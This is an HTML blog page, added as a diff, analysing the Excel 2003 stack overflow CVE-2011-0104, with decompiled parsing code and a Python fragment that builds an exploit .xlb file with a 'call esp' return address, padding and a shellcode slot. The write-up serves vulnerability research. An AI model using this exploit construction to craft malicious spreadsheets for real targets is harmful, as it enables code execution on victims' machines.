@@ -1,0 +1,139 @@
+<!doctype html>
+<html class="no-js">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>CVE-2011-0104分析 - Vap0r's Blog</title>
+
+  <!-- Set render engine for 360 browser -->
+  <meta name="renderer" content="webkit">
+
+  <!-- No Baidu Siteapp-->
+  <meta http-equiv="Cache-Control" content="no-siteapp"/>
+
+  <link rel="icon" type="image/png" href="static/i/favicon.png">
+
+  <!-- Add to homescreen for Chrome on Android -->
+  <meta name="mobile-web-app-capable" content="yes">
+  <link rel="icon" sizes="192x192" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Add to homescreen for Safari on iOS -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="Amaze UI"/>
+  <link rel="apple-touch-icon-precomposed" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Tile icon for Win8 (144x144 + tile color) -->
+  <meta name="msapplication-TileImage" content="static/i/app-icon72x72@2x.png">
+  <meta name="msapplication-TileColor" content="#0e90d2">
+
+  <link rel="stylesheet" href="static/css/amazeui.min.css">
+  <link rel="stylesheet" href="static/css/header.css">
+  <link rel="stylesheet" href="static/css/footer.css">
+  <link rel="stylesheet" href="static/css/single.css">
+  <link rel="stylesheet" href="static/css/sidebar.css">
+  <link rel="stylesheet" href="static/css/railscasts.min.css">
+</head>
+<body>
+
+<!--在这里编写你的代码-->
+
+<div id="header">
+	<a href="/">Vap0r's Blog</a>
+</div>
+
+<div class="am-g body">
+	<div class="am-u-sm-7 am-u-sm-offset-3">
+		<div id="menu" data-am-scrollspy-nav data-am-sticky>
+	<a href="/">Home</a>
+	<a href="about.html">About</a>
+</div>
+		
+		<div id="article">
+			<div class="tags-icon am-icon-tag" id="tags">
+				
+					<span href="#">Exploit</span> 
+				
+					<span href="#">StackOverFlow</span> 
+				
+				<span id="date">2017/03/26</span>
+			</div>		
+			<div id="title">CVE-2011-0104分析</div>
+			<div id="content">
+				<h3>环境</h3>
+<p>受影响软件: Office Excel 2003 (11.8324.8324) SP3</p>
+<h3>分析</h3>
+<p>主程序没有启用DEP ASLR Stack cookie，所以直接覆盖返回地址就行了</p>
+<p>这里我用的2003，有些数据跟公布的POC不一样，后面会说</p>
+<p>Windbg载入程序，加载EXP文件，崩溃后打开IDA网上找 找到来源</p>
+<pre class="lang-c"><code>     else if ( recordType == 167 )             // A7 type
+      {
+      3070EEB7:        
+        field2_dword = &amp;buf[recordLength];
+        v11 = dword_308942E4 &lt; 5;
+        LOBYTE(v11) = dword_308942E4 &gt;= 5;
+        len = &amp;buf[recordLength];
+</code></pre>
+<h5>这里跟着EXP里的数据找，很容易定位到，往下找到有问题的函数</h5>
+<pre class="lang-c"><code>            if ( HIWORD(ret_addr) &amp; 0x12F &amp;&amp; buf2 &gt;= len )
+            {
+              recordType = read_buf();
+              if ( recordType != 0x3C )         // field4
+                goto LABEL_184;                 // 结束标志
+              filed5 = read_buf();
+              v18 = elementSize * field2;
+              len = filed5;
+              buf2 = buf_1 + elementSize * field2 + 3;
+              v19 = get_gbuf_size();
+              read_buf_len(v5, buf2, len, -3u - v18 + v19);// 问题复制内存函数
+</code></pre>
+<p>为了搞清楚，程序流程，我根据OD的RUNTRACE得到下图
+<img alt="data/flow.png" src="data/cve-2011-0104/flow.png">
+可以方便的看到解析数据的执行流程</p>
+<p>与公共POC不同的地方：</p>
+<pre class="lang-python"><code>        recordType = b"\xA7\x00"    #定值
+        recordLenght = b"\x04\x00"
+        field1 = b"\x00" #不重要
+        field2 = b"\x28\x0C" #计算BUFFER地址
+        field3 = b"\x00"     #不重要
+        field4 = b"\x3C\x00" #定值
+        field5 = b"\x00\x03" #读取长度
+
+        eip = b"\x53\x52\x11\x30"    # Call ESP
+
+        fdW = open('exploit2003.xlb', 'wb+')
+        fdW.write(str1)
+        fdW.write(record)    
+        fdW.write(b"\x41")     # padding
+        fdW.write(eip)              
+        #fdW.write("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")      # bypassing a conditional
+        fdW.write(b"\x41"*0x24+b"\xF8\xFF\x89\x30"+b"\x41"*(0x2c-0x24-4))     # padding return 2c, addr must writeable      
+        fdW.write(shellcode)
+</code></pre>
+<p>这里第二次retn 0x2c才能控制EIP，所以填充一些字节,其中一个特殊值是因为返回前有mov dword ptr [addr], imm32,所以要一个地址保证可写</p>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div id="footer">
+	<p>&copy;2015 Vap0r's Blog.</p>
+</div>
+
+<!--[if (gte IE 9)|!(IE)]><!-->
+<script src="static/js/jquery.min.js"></script>
+<!--<![endif]-->
+<!--[if lte IE 8 ]>
+<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
+<script src="static/js/amazeui.ie8polyfill.min.js"></script>
+<![endif]-->
+<script src="static/js/amazeui.min.js"></script>
+<script src="static/js/highlight.min.js"></script>
+<script >hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
